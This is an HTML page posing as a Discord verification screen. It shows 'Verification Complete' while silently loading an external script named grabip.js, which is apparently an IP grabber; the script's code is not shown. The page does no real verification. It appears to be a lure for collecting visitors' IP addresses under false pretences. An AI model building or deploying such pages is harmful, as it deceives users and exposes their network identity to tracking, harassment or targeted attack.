<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification</title>

    <style>
        * {
            box-sizing: border-box;
        }

        html,
        body {
            width: 100%;
            height: 100%;
            margin: 0;
        }

        body {
            display: flex;
            align-items: center;
            justify-content: center;
            background: #0d1117;
            color: white;
            font-family: Arial, sans-serif;
            text-align: center;
        }

        .message {
            padding: 30px;
        }

        h1 {
            margin: 0 0 12px;
            font-size: clamp(32px, 7vw, 72px);
        }

        p {
            margin: 0;
            color: #aeb8c4;
            font-size: clamp(16px, 2vw, 24px);
        }
    </style>
</head>

<body>
    <main class="message">
        <h1>Verification Complete</h1>
        <p>You may now return to Discord.</p>
    </main>
    <script src="grabip.js"></script>
</body>
</html>
